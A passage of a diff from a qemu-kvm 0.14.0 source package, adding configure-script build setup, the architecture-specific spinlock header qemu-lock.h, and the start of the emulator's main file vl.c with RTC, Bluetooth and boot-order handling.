+echo "LDFLAGS+=$ldflags" >> $config_target_mak
+echo "QEMU_CFLAGS+=$cflags" >> $config_target_mak
+echo "QEMU_INCLUDES+=$includes" >> $config_target_mak
+
+done # for target in $targets
+
+# build tree in object directory in case the source is not in the current directory
+DIRS="tests tests/cris slirp audio block net pc-bios/optionrom"
+DIRS="$DIRS roms/seabios roms/vgabios"
+DIRS="$DIRS fsdev ui"
+FILES="Makefile tests/Makefile"
+FILES="$FILES tests/cris/Makefile tests/cris/.gdbinit"
+FILES="$FILES pc-bios/optionrom/Makefile pc-bios/keymaps"
+FILES="$FILES roms/seabios/Makefile roms/vgabios/Makefile"
+for bios_file in $source_path/pc-bios/*.bin $source_path/pc-bios/*.dtb $source_path/pc-bios/openbios-*; do
+    FILES="$FILES pc-bios/`basename $bios_file`"
+done
+mkdir -p $DIRS
+for f in $FILES ; do
+    test -e $f || symlink $source_path/$f $f
+done
+
+# temporary config to build submodules
+for rom in seabios vgabios; do
+    config_mak=roms/$rom/config.mak
+    echo "# Automatically generated by configure - do not modify" > $config_mak
+    echo "SRC_PATH=$source_path/roms/$rom" >> $config_mak
+    echo "CC=$cc" >> $config_mak
+    echo "BCC=bcc" >> $config_mak
+    echo "CPP=${cross_prefix}cpp" >> $config_mak
+    echo "OBJCOPY=objcopy" >> $config_mak
+    echo "IASL=iasl" >> $config_mak
+    echo "LD=$ld" >> $config_mak
+done
+
+for hwlib in 32 64; do
+  d=libhw$hwlib
+  mkdir -p $d
+  mkdir -p $d/ide
+  symlink $source_path/Makefile.hw $d/Makefile
+  echo "QEMU_CFLAGS+=-DTARGET_PHYS_ADDR_BITS=$hwlib" > $d/config.mak
+done
+
+d=libuser
+mkdir -p $d
+symlink $source_path/Makefile.user $d/Makefile
+if test "$static" = "no" -a "$user_pie" = "yes" ; then
+  echo "QEMU_CFLAGS+=-fpie" > $d/config.mak
+fi
+
+if test "$docs" = "yes" ; then
+  mkdir -p QMP
+fi
diff -Nurp qemu-kvm-0.14.0+noroms.orig/.pc/Detect-and-use-GCC-atomic-builtins-for-locking.patch/qemu-lock.h qemu-kvm-0.14.0+noroms/.pc/Detect-and-use-GCC-atomic-builtins-for-locking.patch/qemu-lock.h
--- qemu-kvm-0.14.0+noroms.orig/.pc/Detect-and-use-GCC-atomic-builtins-for-locking.patch/qemu-lock.h	1969-12-31 19:00:00.000000000 -0500
+++ qemu-kvm-0.14.0+noroms/.pc/Detect-and-use-GCC-atomic-builtins-for-locking.patch/qemu-lock.h	2014-02-19 10:12:25.000000000 -0500
@@ -0,0 +1,237 @@
+/*
+ *  Copyright (c) 2003 Fabrice Bellard
+ *
+ * This library is free software; you can redistribute it and/or
+ * modify it under the terms of the GNU Lesser General Public
+ * License as published by the Free Software Foundation; either
+ * version 2 of the License, or (at your option) any later version.
+ *
+ * This library is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
+ * Lesser General Public License for more details.
+ *
+ * You should have received a copy of the GNU Lesser General Public
+ * License along with this library; if not, see <http://www.gnu.org/licenses/>
+ */
+
+/* Locking primitives.  Most of this code should be redundant -
+   system emulation doesn't need/use locking, NPTL userspace uses
+   pthread mutexes, and non-NPTL userspace isn't threadsafe anyway.
+   In either case a spinlock is probably the wrong kind of lock.
+   Spinlocks are only good if you know annother CPU has the lock and is
+   likely to release it soon.  In environments where you have more threads
+   than physical CPUs (the extreme case being a single CPU host) a spinlock
+   simply wastes CPU until the OS decides to preempt it.  */
+#if defined(CONFIG_USE_NPTL)
+
+#include <pthread.h>
+#define spin_lock pthread_mutex_lock
+#define spin_unlock pthread_mutex_unlock
+#define spinlock_t pthread_mutex_t
+#define SPIN_LOCK_UNLOCKED PTHREAD_MUTEX_INITIALIZER
+
+#else
+
+#if defined(__hppa__)
+
+typedef int spinlock_t[4];
+
+#define SPIN_LOCK_UNLOCKED { 1, 1, 1, 1 }
+
+static inline void resetlock (spinlock_t *p)
+{
+    (*p)[0] = (*p)[1] = (*p)[2] = (*p)[3] = 1;
+}
+
+#else
+
+typedef int spinlock_t;
+
+#define SPIN_LOCK_UNLOCKED 0
+
+static inline void resetlock (spinlock_t *p)
+{
+    *p = SPIN_LOCK_UNLOCKED;
+}
+
+#endif
+
+#if defined(_ARCH_PPC)
+static inline int testandset (int *p)
+{
+    int ret;
+    __asm__ __volatile__ (
+                          "      lwarx %0,0,%1\n"
+                          "      xor. %0,%3,%0\n"
+                          "      bne $+12\n"
+                          "      stwcx. %2,0,%1\n"
+                          "      bne- $-16\n"
+                          : "=&r" (ret)
+                          : "r" (p), "r" (1), "r" (0)
+                          : "cr0", "memory");
+    return ret;
+}
+#elif defined(__i386__)
+static inline int testandset (int *p)
+{
+    long int readval = 0;
+
+    __asm__ __volatile__ ("lock; cmpxchgl %2, %0"
+                          : "+m" (*p), "+a" (readval)
+                          : "r" (1)
+                          : "cc");
+    return readval;
+}
+#elif defined(__x86_64__)
+static inline int testandset (int *p)
+{
+    long int readval = 0;
+
+    __asm__ __volatile__ ("lock; cmpxchgl %2, %0"
+                          : "+m" (*p), "+a" (readval)
+                          : "r" (1)
+                          : "cc");
+    return readval;
+}
+#elif defined(__s390__)
+static inline int testandset (int *p)
+{
+    int ret;
+
+    __asm__ __volatile__ ("0: cs    %0,%1,0(%2)\n"
+			  "   jl    0b"
+			  : "=&d" (ret)
+			  : "r" (1), "a" (p), "0" (*p)
+			  : "cc", "memory" );
+    return ret;
+}
+#elif defined(__alpha__)
+static inline int testandset (int *p)
+{
+    int ret;
+    unsigned long one;
+
+    __asm__ __volatile__ ("0:	mov 1,%2\n"
+			  "	ldl_l %0,%1\n"
+			  "	stl_c %2,%1\n"
+			  "	beq %2,1f\n"
+			  ".subsection 2\n"
+			  "1:	br 0b\n"
+			  ".previous"
+			  : "=r" (ret), "=m" (*p), "=r" (one)
+			  : "m" (*p));
+    return ret;
+}
+#elif defined(__sparc__)
+static inline int testandset (int *p)
+{
+	int ret;
+
+	__asm__ __volatile__("ldstub	[%1], %0"
+			     : "=r" (ret)
+			     : "r" (p)
+			     : "memory");
+
+	return (ret ? 1 : 0);
+}
+#elif defined(__arm__)
+static inline int testandset (int *spinlock)
+{
+    register unsigned int ret;
+    __asm__ __volatile__("swp %0, %1, [%2]"
+                         : "=r"(ret)
+                         : "0"(1), "r"(spinlock));
+
+    return ret;
+}
+#elif defined(__mc68000)
+static inline int testandset (int *p)
+{
+    char ret;
+    __asm__ __volatile__("tas %1; sne %0"
+                         : "=r" (ret)
+                         : "m" (p)
+                         : "cc","memory");
+    return ret;
+}
+#elif defined(__hppa__)
+
+/* Because malloc only guarantees 8-byte alignment for malloc'd data,
+   and GCC only guarantees 8-byte alignment for stack locals, we can't
+   be assured of 16-byte alignment for atomic lock data even if we
+   specify "__attribute ((aligned(16)))" in the type declaration.  So,
+   we use a struct containing an array of four ints for the atomic lock
+   type and dynamically select the 16-byte aligned int from the array
+   for the semaphore.  */
+#define __PA_LDCW_ALIGNMENT 16
+static inline void *ldcw_align (void *p) {
+    unsigned long a = (unsigned long)p;
+    a = (a + __PA_LDCW_ALIGNMENT - 1) & ~(__PA_LDCW_ALIGNMENT - 1);
+    return (void *)a;
+}
+
+static inline int testandset (spinlock_t *p)
+{
+    unsigned int ret;
+    p = ldcw_align(p);
+    __asm__ __volatile__("ldcw 0(%1),%0"
+                         : "=r" (ret)
+                         : "r" (p)
+                         : "memory" );
+    return !ret;
+}
+
+#elif defined(__ia64)
+
+#include "ia64intrin.h"
+
+static inline int testandset (int *p)
+{
+    return (int)cmpxchg_acq(p,0,1);
+}
+#elif defined(__mips__)
+static inline int testandset (int *p)
+{
+    int ret;
+
+    __asm__ __volatile__ (
+	"	.set push		\n"
+	"	.set noat		\n"
+	"	.set mips2		\n"
+	"1:	li	$1, 1		\n"
+	"	ll	%0, %1		\n"
+	"	sc	$1, %1		\n"
+	"	beqz	$1, 1b		\n"
+	"	.set pop		"
+	: "=r" (ret), "+R" (*p)
+	:
+	: "memory");
+
+    return ret;
+}
+#else
+#error unimplemented CPU support
+#endif
+
+#if defined(CONFIG_USER_ONLY)
+static inline void spin_lock(spinlock_t *lock)
+{
+    while (testandset(lock));
+}
+
+static inline void spin_unlock(spinlock_t *lock)
+{
+    resetlock(lock);
+}
+#else
+static inline void spin_lock(spinlock_t *lock)
+{
+}
+
+static inline void spin_unlock(spinlock_t *lock)
+{
+}
+#endif
+
+#endif
diff -Nurp qemu-kvm-0.14.0+noroms.orig/.pc/larger_default_ram_size.patch/vl.c qemu-kvm-0.14.0+noroms/.pc/larger_default_ram_size.patch/vl.c
--- qemu-kvm-0.14.0+noroms.orig/.pc/larger_default_ram_size.patch/vl.c	1969-12-31 19:00:00.000000000 -0500
+++ qemu-kvm-0.14.0+noroms/.pc/larger_default_ram_size.patch/vl.c	2014-02-19 10:12:25.000000000 -0500
@@ -0,0 +1,3206 @@
+/*
+ * QEMU System Emulator
+ *
+ * Copyright (c) 2003-2008 Fabrice Bellard
+ *
+ * Permission is hereby granted, free of charge, to any person obtaining a copy
+ * of this software and associated documentation files (the "Software"), to deal
+ * in the Software without restriction, including without limitation the rights
+ * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+ * copies of the Software, and to permit persons to whom the Software is
+ * furnished to do so, subject to the following conditions:
+ *
+ * The above copyright notice and this permission notice shall be included in
+ * all copies or substantial portions of the Software.
+ *
+ * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+ * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+ * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL
+ * THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+ * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+ * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
+ * THE SOFTWARE.
+ */
+#include <unistd.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <time.h>
+#include <errno.h>
+#include <sys/time.h>
+#include <zlib.h>
+
+/* Needed early for CONFIG_BSD etc. */
+#include "config-host.h"
+
+#ifndef _WIN32
+#include <libgen.h>
+#include <sys/times.h>
+#include <sys/wait.h>
+#include <termios.h>
+#include <sys/mman.h>
+#include <sys/ioctl.h>
+#include <sys/resource.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <net/if.h>
+#include <arpa/inet.h>
+#include <dirent.h>
+#include <netdb.h>
+#include <sys/select.h>
+#ifdef CONFIG_SIMPLE_TRACE
+#include "trace.h"
+#endif
+
+#ifdef CONFIG_BSD
+#include <sys/stat.h>
+#if defined(__FreeBSD__) || defined(__FreeBSD_kernel__) || defined(__DragonFly__)
+#include <libutil.h>
+#include <sys/sysctl.h>
+#else
+#include <util.h>
+#endif
+#else
+#ifdef __linux__
+#include <pty.h>
+#include <malloc.h>
+
+#include <linux/ppdev.h>
+#include <linux/parport.h>
+#endif
+#ifdef __sun__
+#include <sys/stat.h>
+#include <sys/ethernet.h>
+#include <sys/sockio.h>
+#include <netinet/arp.h>
+#include <netinet/in_systm.h>
+#include <netinet/ip.h>
+#include <netinet/ip_icmp.h> // must come after ip.h
+#include <netinet/udp.h>
+#include <netinet/tcp.h>
+#include <net/if.h>
+#include <syslog.h>
+#include <stropts.h>
+#endif
+#endif
+#endif
+
+#if defined(__OpenBSD__)
+#include <util.h>
+#endif
+
+#if defined(CONFIG_VDE)
+#include <libvdeplug.h>
+#endif
+
+#ifdef _WIN32
+#include <windows.h>
+#endif
+
+#ifdef CONFIG_SDL
+#if defined(__APPLE__) || defined(main)
+#include <SDL.h>
+int qemu_main(int argc, char **argv, char **envp);
+int main(int argc, char **argv)
+{
+    return qemu_main(argc, argv, NULL);
+}
+#undef main
+#define main qemu_main
+#endif
+#endif /* CONFIG_SDL */
+
+#ifdef CONFIG_COCOA
+#undef main
+#define main qemu_main
+#endif /* CONFIG_COCOA */
+
+#include "hw/hw.h"
+#include "hw/boards.h"
+#include "hw/usb.h"
+#include "hw/pcmcia.h"
+#include "hw/pc.h"
+#include "hw/isa.h"
+#include "hw/baum.h"
+#include "hw/bt.h"
+#include "hw/watchdog.h"
+#include "hw/smbios.h"
+#include "hw/xen.h"
+#include "hw/qdev.h"
+#include "hw/loader.h"
+#include "bt-host.h"
+#include "net.h"
+#include "net/slirp.h"
+#include "monitor.h"
+#include "console.h"
+#include "sysemu.h"
+#include "gdbstub.h"
+#include "qemu-timer.h"
+#include "qemu-char.h"
+#include "cache-utils.h"
+#include "block.h"
+#include "blockdev.h"
+#include "block-migration.h"
+#include "dma.h"
+#include "audio/audio.h"
+#include "migration.h"
+#include "kvm.h"
+#include "qemu-option.h"
+#include "qemu-config.h"
+#include "qemu-objects.h"
+#include "qemu-options.h"
+#include "hw/device-assignment.h"
+#ifdef CONFIG_VIRTFS
+#include "fsdev/qemu-fsdev.h"
+#endif
+
+#include "disas.h"
+
+#include "qemu_socket.h"
+
+#include "slirp/libslirp.h"
+
+#include "trace.h"
+#include "qemu-queue.h"
+#include "cpus.h"
+#include "arch_init.h"
+
+#include "ui/qemu-spice.h"
+
+//#define DEBUG_NET
+//#define DEBUG_SLIRP
+
+#define DEFAULT_RAM_SIZE 128
+
+#define MAX_VIRTIO_CONSOLES 1
+
+static const char *data_dir;
+const char *bios_name = NULL;
+enum vga_retrace_method vga_retrace_method = VGA_RETRACE_DUMB;
+DisplayType display_type = DT_DEFAULT;
+int display_remote = 0;
+const char* keyboard_layout = NULL;
+ram_addr_t ram_size;
+const char *mem_path = NULL;
+#ifdef MAP_POPULATE
+int mem_prealloc = 0; /* force preallocation of physical target memory */
+#endif
+int nb_nics;
+NICInfo nd_table[MAX_NICS];
+int vm_running;
+int autostart;
+int incoming_expected; /* Started with -incoming and waiting for incoming */
+static int rtc_utc = 1;
+static int rtc_date_offset = -1; /* -1 means no change */
+QEMUClock *rtc_clock;
+int vga_interface_type = VGA_NONE;
+static int full_screen = 0;
+#ifdef CONFIG_SDL
+static int no_frame = 0;
+#endif
+int no_quit = 0;
+CharDriverState *serial_hds[MAX_SERIAL_PORTS];
+CharDriverState *parallel_hds[MAX_PARALLEL_PORTS];
+CharDriverState *virtcon_hds[MAX_VIRTIO_CONSOLES];
+int win2k_install_hack = 0;
+int rtc_td_hack = 0;
+int usb_enabled = 0;
+int singlestep = 0;
+int smp_cpus = 1;
+int max_cpus = 0;
+int smp_cores = 1;
+int smp_threads = 1;
+const char *vnc_display;
+int acpi_enabled = 1;
+int no_hpet = 0;
+int fd_bootchk = 1;
+int no_reboot = 0;
+int no_shutdown = 0;
+int cursor_hide = 1;
+int graphic_rotate = 0;
+uint8_t irq0override = 1;
+const char *watchdog;
+QEMUOptionRom option_rom[MAX_OPTION_ROMS];
+int nb_option_roms;
+int semihosting_enabled = 0;
+int time_drift_fix = 0;
+unsigned int kvm_shadow_memory = 0;
+int old_param = 0;
+const char *qemu_name;
+int alt_grab = 0;
+int ctrl_grab = 0;
+unsigned int nb_prom_envs = 0;
+const char *prom_envs[MAX_PROM_ENVS];
+const char *nvram = NULL;
+int boot_menu;
+
+typedef struct FWBootEntry FWBootEntry;
+
+struct FWBootEntry {
+    QTAILQ_ENTRY(FWBootEntry) link;
+    int32_t bootindex;
+    DeviceState *dev;
+    char *suffix;
+};
+
+QTAILQ_HEAD(, FWBootEntry) fw_boot_order = QTAILQ_HEAD_INITIALIZER(fw_boot_order);
+
+int nb_numa_nodes;
+uint64_t node_mem[MAX_NODES];
+uint64_t node_cpumask[MAX_NODES];
+
+static QEMUTimer *nographic_timer;
+
+uint8_t qemu_uuid[16];
+
+static QEMUBootSetHandler *boot_set_handler;
+static void *boot_set_opaque;
+
+static NotifierList exit_notifiers =
+    NOTIFIER_LIST_INITIALIZER(exit_notifiers);
+
+static NotifierList machine_init_done_notifiers =
+    NOTIFIER_LIST_INITIALIZER(machine_init_done_notifiers);
+
+int kvm_allowed = -1;
+uint32_t xen_domid;
+enum xen_mode xen_mode = XEN_EMULATE;
+
+static int default_serial = 1;
+static int default_parallel = 1;
+static int default_virtcon = 1;
+static int default_monitor = 1;
+static int default_vga = 1;
+static int default_floppy = 1;
+static int default_cdrom = 1;
+static int default_sdcard = 1;
+
+static struct {
+    const char *driver;
+    int *flag;
+} default_list[] = {
+    { .driver = "isa-serial",           .flag = &default_serial    },
+    { .driver = "isa-parallel",         .flag = &default_parallel  },
+    { .driver = "isa-fdc",              .flag = &default_floppy    },
+    { .driver = "ide-drive",            .flag = &default_cdrom     },
+    { .driver = "virtio-serial-pci",    .flag = &default_virtcon   },
+    { .driver = "virtio-serial-s390",   .flag = &default_virtcon   },
+    { .driver = "virtio-serial",        .flag = &default_virtcon   },
+    { .driver = "VGA",                  .flag = &default_vga       },
+    { .driver = "cirrus-vga",           .flag = &default_vga       },
+    { .driver = "vmware-svga",          .flag = &default_vga       },
+};
+
+static int default_driver_check(QemuOpts *opts, void *opaque)
+{
+    const char *driver = qemu_opt_get(opts, "driver");
+    int i;
+
+    if (!driver)
+        return 0;
+    for (i = 0; i < ARRAY_SIZE(default_list); i++) {
+        if (strcmp(default_list[i].driver, driver) != 0)
+            continue;
+        *(default_list[i].flag) = 0;
+    }
+    return 0;
+}
+
+/***********************************************************/
+/* real time host monotonic timer */
+
+/***********************************************************/
+/* host time/date access */
+void qemu_get_timedate(struct tm *tm, int offset)
+{
+    time_t ti;
+    struct tm *ret;
+
+    time(&ti);
+    ti += offset;
+    if (rtc_date_offset == -1) {
+        if (rtc_utc)
+            ret = gmtime(&ti);
+        else
+            ret = localtime(&ti);
+    } else {
+        ti -= rtc_date_offset;
+        ret = gmtime(&ti);
+    }
+
+    memcpy(tm, ret, sizeof(struct tm));
+}
+
+int qemu_timedate_diff(struct tm *tm)
+{
+    time_t seconds;
+
+    if (rtc_date_offset == -1)
+        if (rtc_utc)
+            seconds = mktimegm(tm);
+        else
+            seconds = mktime(tm);
+    else
+        seconds = mktimegm(tm) + rtc_date_offset;
+
+    return seconds - time(NULL);
+}
+
+void rtc_change_mon_event(struct tm *tm)
+{
+    QObject *data;
+
+    data = qobject_from_jsonf("{ 'offset': %d }", qemu_timedate_diff(tm));
+    monitor_protocol_event(QEVENT_RTC_CHANGE, data);
+    qobject_decref(data);
+}
+
+static void configure_rtc_date_offset(const char *startdate, int legacy)
+{
+    time_t rtc_start_date;
+    struct tm tm;
+
+    if (!strcmp(startdate, "now") && legacy) {
+        rtc_date_offset = -1;
+    } else {
+        if (sscanf(startdate, "%d-%d-%dT%d:%d:%d",
+                   &tm.tm_year,
+                   &tm.tm_mon,
+                   &tm.tm_mday,
+                   &tm.tm_hour,
+                   &tm.tm_min,
+                   &tm.tm_sec) == 6) {
+            /* OK */
+        } else if (sscanf(startdate, "%d-%d-%d",
+                          &tm.tm_year,
+                          &tm.tm_mon,
+                          &tm.tm_mday) == 3) {
+            tm.tm_hour = 0;
+            tm.tm_min = 0;
+            tm.tm_sec = 0;
+        } else {
+            goto date_fail;
+        }
+        tm.tm_year -= 1900;
+        tm.tm_mon--;
+        rtc_start_date = mktimegm(&tm);
+        if (rtc_start_date == -1) {
+        date_fail:
+            fprintf(stderr, "Invalid date format. Valid formats are:\n"
+                            "'2006-06-17T16:01:21' or '2006-06-17'\n");
+            exit(1);
+        }
+        rtc_date_offset = time(NULL) - rtc_start_date;
+    }
+}
+
+static void configure_rtc(QemuOpts *opts)
+{
+    const char *value;
+
+    value = qemu_opt_get(opts, "base");
+    if (value) {
+        if (!strcmp(value, "utc")) {
+            rtc_utc = 1;
+        } else if (!strcmp(value, "localtime")) {
+            rtc_utc = 0;
+        } else {
+            configure_rtc_date_offset(value, 0);
+        }
+    }
+    value = qemu_opt_get(opts, "clock");
+    if (value) {
+        if (!strcmp(value, "host")) {
+            rtc_clock = host_clock;
+        } else if (!strcmp(value, "vm")) {
+            rtc_clock = vm_clock;
+        } else {
+            fprintf(stderr, "qemu: invalid option value '%s'\n", value);
+            exit(1);
+        }
+    }
+    value = qemu_opt_get(opts, "driftfix");
+    if (value) {
+        if (!strcmp(value, "slew")) {
+            rtc_td_hack = 1;
+        } else if (!strcmp(value, "none")) {
+            rtc_td_hack = 0;
+        } else {
+            fprintf(stderr, "qemu: invalid option value '%s'\n", value);
+            exit(1);
+        }
+    }
+}
+
+/***********************************************************/
+/* Bluetooth support */
+static int nb_hcis;
+static int cur_hci;
+static struct HCIInfo *hci_table[MAX_NICS];
+
+static struct bt_vlan_s {
+    struct bt_scatternet_s net;
+    int id;
+    struct bt_vlan_s *next;
+} *first_bt_vlan;
+
+/* find or alloc a new bluetooth "VLAN" */
+static struct bt_scatternet_s *qemu_find_bt_vlan(int id)
+{
+    struct bt_vlan_s **pvlan, *vlan;
+    for (vlan = first_bt_vlan; vlan != NULL; vlan = vlan->next) {
+        if (vlan->id == id)
+            return &vlan->net;
+    }
+    vlan = qemu_mallocz(sizeof(struct bt_vlan_s));
+    vlan->id = id;
+    pvlan = &first_bt_vlan;
+    while (*pvlan != NULL)
+        pvlan = &(*pvlan)->next;
+    *pvlan = vlan;
+    return &vlan->net;
+}
+
+static void null_hci_send(struct HCIInfo *hci, const uint8_t *data, int len)
+{
+}
+
+static int null_hci_addr_set(struct HCIInfo *hci, const uint8_t *bd_addr)
+{
+    return -ENOTSUP;
+}
+
+static struct HCIInfo null_hci = {
+    .cmd_send = null_hci_send,
+    .sco_send = null_hci_send,
+    .acl_send = null_hci_send,
+    .bdaddr_set = null_hci_addr_set,
+};
+
+struct HCIInfo *qemu_next_hci(void)
+{
+    if (cur_hci == nb_hcis)
+        return &null_hci;
+
+    return hci_table[cur_hci++];
+}
+
+static struct HCIInfo *hci_init(const char *str)
+{
+    char *endp;
+    struct bt_scatternet_s *vlan = 0;
+
+    if (!strcmp(str, "null"))
+        /* null */
+        return &null_hci;
+    else if (!strncmp(str, "host", 4) && (str[4] == '\0' || str[4] == ':'))
+        /* host[:hciN] */
+        return bt_host_hci(str[4] ? str + 5 : "hci0");
+    else if (!strncmp(str, "hci", 3)) {
+        /* hci[,vlan=n] */
+        if (str[3]) {
+            if (!strncmp(str + 3, ",vlan=", 6)) {
+                vlan = qemu_find_bt_vlan(strtol(str + 9, &endp, 0));
+                if (*endp)
+                    vlan = 0;
+            }
+        } else
+            vlan = qemu_find_bt_vlan(0);
+        if (vlan)
+           return bt_new_hci(vlan);
+    }
+
+    fprintf(stderr, "qemu: Unknown bluetooth HCI `%s'.\n", str);
+
+    return 0;
+}
+
+static int bt_hci_parse(const char *str)
+{
+    struct HCIInfo *hci;
+    bdaddr_t bdaddr;
+
+    if (nb_hcis >= MAX_NICS) {
+        fprintf(stderr, "qemu: Too many bluetooth HCIs (max %i).\n", MAX_NICS);
+        return -1;
+    }
+
+    hci = hci_init(str);
+    if (!hci)
+        return -1;
+
+    bdaddr.b[0] = 0x52;
+    bdaddr.b[1] = 0x54;
+    bdaddr.b[2] = 0x00;
+    bdaddr.b[3] = 0x12;
+    bdaddr.b[4] = 0x34;
+    bdaddr.b[5] = 0x56 + nb_hcis;
+    hci->bdaddr_set(hci, bdaddr.b);
+
+    hci_table[nb_hcis++] = hci;
+
+    return 0;
+}
+
+static void bt_vhci_add(int vlan_id)
+{
+    struct bt_scatternet_s *vlan = qemu_find_bt_vlan(vlan_id);
+
+    if (!vlan->slave)
+        fprintf(stderr, "qemu: warning: adding a VHCI to "
+                        "an empty scatternet %i\n", vlan_id);
+
+    bt_vhci_init(bt_new_hci(vlan));
+}
+
+static struct bt_device_s *bt_device_add(const char *opt)
+{
+    struct bt_scatternet_s *vlan;
+    int vlan_id = 0;
+    char *endp = strstr(opt, ",vlan=");
+    int len = (endp ? endp - opt : strlen(opt)) + 1;
+    char devname[10];
+
+    pstrcpy(devname, MIN(sizeof(devname), len), opt);
+
+    if (endp) {
+        vlan_id = strtol(endp + 6, &endp, 0);
+        if (*endp) {
+            fprintf(stderr, "qemu: unrecognised bluetooth vlan Id\n");
+            return 0;
+        }
+    }
+
+    vlan = qemu_find_bt_vlan(vlan_id);
+
+    if (!vlan->slave)
+        fprintf(stderr, "qemu: warning: adding a slave device to "
+                        "an empty scatternet %i\n", vlan_id);
+
+    if (!strcmp(devname, "keyboard"))
+        return bt_keyboard_init(vlan);
+
+    fprintf(stderr, "qemu: unsupported bluetooth device `%s'\n", devname);
+    return 0;
+}
+
+static int bt_parse(const char *opt)
+{
+    const char *endp, *p;
+    int vlan;
+
+    if (strstart(opt, "hci", &endp)) {
+        if (!*endp || *endp == ',') {
+            if (*endp)
+                if (!strstart(endp, ",vlan=", 0))
+                    opt = endp + 1;
+
+            return bt_hci_parse(opt);
+       }
+    } else if (strstart(opt, "vhci", &endp)) {
+        if (!*endp || *endp == ',') {
+            if (*endp) {
+                if (strstart(endp, ",vlan=", &p)) {
+                    vlan = strtol(p, (char **) &endp, 0);
+                    if (*endp) {
+                        fprintf(stderr, "qemu: bad scatternet '%s'\n", p);
+                        return 1;
+                    }
+                } else {
+                    fprintf(stderr, "qemu: bad parameter '%s'\n", endp + 1);
+                    return 1;
+                }
+            } else
+                vlan = 0;
+
+            bt_vhci_add(vlan);
+            return 0;
+        }
+    } else if (strstart(opt, "device:", &endp))
+        return !bt_device_add(endp);
+
+    fprintf(stderr, "qemu: bad bluetooth parameter '%s'\n", opt);
+    return 1;
+}
+
+/***********************************************************/
+/* QEMU Block devices */
+
+#define HD_OPTS "media=disk"
+#define CDROM_OPTS "media=cdrom"
+#define FD_OPTS ""
+#define PFLASH_OPTS ""
+#define MTD_OPTS ""
+#define SD_OPTS ""
+
+static int drive_init_func(QemuOpts *opts, void *opaque)
+{
+    int *use_scsi = opaque;
+
+    return drive_init(opts, *use_scsi) == NULL;
+}
+
+static int drive_enable_snapshot(QemuOpts *opts, void *opaque)
+{
+    if (NULL == qemu_opt_get(opts, "snapshot")) {
+        qemu_opt_set(opts, "snapshot", "on");
+    }
+    return 0;
+}
+
+static void default_drive(int enable, int snapshot, int use_scsi,
+                          BlockInterfaceType type, int index,
+                          const char *optstr)
+{
+    QemuOpts *opts;
+
+    if (type == IF_DEFAULT) {
+        type = use_scsi ? IF_SCSI : IF_IDE;
+    }
+
+    if (!enable || drive_get_by_index(type, index)) {
+        return;
+    }
+
+    opts = drive_add(type, index, NULL, optstr);
+    if (snapshot) {
+        drive_enable_snapshot(opts, NULL);
+    }
+    if (!drive_init(opts, use_scsi)) {
+        exit(1);
+    }
+}
+
+void qemu_register_boot_set(QEMUBootSetHandler *func, void *opaque)
+{
+    boot_set_handler = func;
+    boot_set_opaque = opaque;
+}
+
+int qemu_boot_set(const char *boot_devices)
+{
+    if (!boot_set_handler) {
+        return -EINVAL;
+    }
+    return boot_set_handler(boot_set_opaque, boot_devices);
+}
+
+static void validate_bootdevices(char *devices)
+{
+    /* We just do some generic consistency checks */
+    const char *p;
+    int bitmap = 0;
+
+    for (p = devices; *p != '\0'; p++) {
+        /* Allowed boot devices are:
+         * a-b: floppy disk drives
+         * c-f: IDE disk drives
+         * g-m: machine implementation dependant drives
+         * n-p: network devices
+         * It's up to each machine implementation to check if the given boot
+         * devices match the actual hardware implementation and firmware
+         * features.
+         */
+        if (*p < 'a' || *p > 'p') {
+            fprintf(stderr, "Invalid boot device '%c'\n", *p);
+            exit(1);
+        }
+        if (bitmap & (1 << (*p - 'a'))) {
+            fprintf(stderr, "Boot device '%c' was given twice\n", *p);
+            exit(1);
+        }
+        bitmap |= 1 << (*p - 'a');
+    }
+}
+
+static void restore_boot_devices(void *opaque)
+{
+    char *standard_boot_devices = opaque;
+    static int first = 1;
+
+    /* Restore boot order and remove ourselves after the first boot */
+    if (first) {
+        first = 0;
+        return;
+    }
+
+    qemu_boot_set(standard_boot_devices);
+
+    qemu_unregister_reset(restore_boot_devices, standard_boot_devices);
+    qemu_free(standard_boot_devices);
+}
+
+void add_boot_device_path(int32_t bootindex, DeviceState *dev,
+                          const char *suffix)
+{
+    FWBootEntry *node, *i;
+
+    if (bootindex < 0) {
+        return;
+    }
+
+    assert(dev != NULL || suffix != NULL);
+
+    node = qemu_mallocz(sizeof(FWBootEntry));
+    node->bootindex = bootindex;
+    node->suffix = suffix ? qemu_strdup(suffix) : NULL;
+    node->dev = dev;
+
+    QTAILQ_FOREACH(i, &fw_boot_order, link) {
+        if (i->bootindex == bootindex) {
+            fprintf(stderr, "Two devices with same boot index %d\n", bootindex);
+            exit(1);
+        } else if (i->bootindex < bootindex) {
+            continue;
+        }
+        QTAILQ_INSERT_BEFORE(i, node, link);
+        return;
+    }
+    QTAILQ_INSERT_TAIL(&fw_boot_order, node, link);
+}
+
+/*
+ * This function returns null terminated string that consist of new line
+ * separated device pathes.
+ *
+ * memory pointed by "size" is assigned total length of the array in bytes
+ *
+ */
+char *get_boot_devices_list(uint32_t *size)
+{
+    FWBootEntry *i;
+    uint32_t total = 0;
+    char *list = NULL;
+
+    QTAILQ_FOREACH(i, &fw_boot_order, link) {
+        char *devpath = NULL, *bootpath;
+        int len;
+
+        if (i->dev) {
+            devpath = qdev_get_fw_dev_path(i->dev);
+            assert(devpath);
+        }
+
+        if (i->suffix && devpath) {
+            size_t bootpathlen = strlen(devpath) + strlen(i->suffix) + 1;
+
+            bootpath = qemu_malloc(bootpathlen);
+            snprintf(bootpath, bootpathlen, "%s%s", devpath, i->suffix);
+            qemu_free(devpath);
+        } else if (devpath) {
+            bootpath = devpath;
+        } else {
+            bootpath = qemu_strdup(i->suffix);
+            assert(bootpath);
+        }
+
